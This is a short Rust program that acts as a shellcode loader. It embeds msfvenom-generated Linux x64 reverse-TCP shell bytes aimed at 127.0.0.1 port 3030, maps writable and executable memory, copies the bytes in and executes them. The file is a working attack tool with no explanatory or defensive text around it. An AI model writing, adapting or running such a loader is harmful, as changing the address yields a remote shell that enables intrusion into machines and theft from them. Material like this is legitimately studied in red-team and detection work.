use std::{mem::transmute, ptr::{copy, null_mut}};

use libc::{mmap, MAP_ANONYMOUS, MAP_FAILED, MAP_PRIVATE, PROT_EXEC, PROT_WRITE};

fn main() {
    // msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=3030 -f rust
    let buf: [u8; 74] = [
        0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x0f, 0x05, 0x48, 0x97, 0x48,
        0xb9, 0x02, 0x00, 0x0b, 0xd6, 0x7f, 0x00, 0x00, 0x01, 0x51, 0x48, 0x89, 0xe6, 0x6a, 0x10,
        0x5a, 0x6a, 0x2a, 0x58, 0x0f, 0x05, 0x6a, 0x03, 0x5e, 0x48, 0xff, 0xce, 0x6a, 0x21, 0x58,
        0x0f, 0x05, 0x75, 0xf6, 0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f,
        0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x52, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05,
    ];

    unsafe {
        let mem = mmap(
            null_mut(),
            buf.len(),
            PROT_WRITE | PROT_EXEC,
            MAP_PRIVATE | MAP_ANONYMOUS,
            -1,
            0,
        );

        if mem == MAP_FAILED {
            eprintln!("Failed to allocate memory");
            return;
        }

        copy(buf.as_ptr(), mem as _, buf.len());

        let func: extern "C" fn() = transmute(mem);

        func();
    };
}
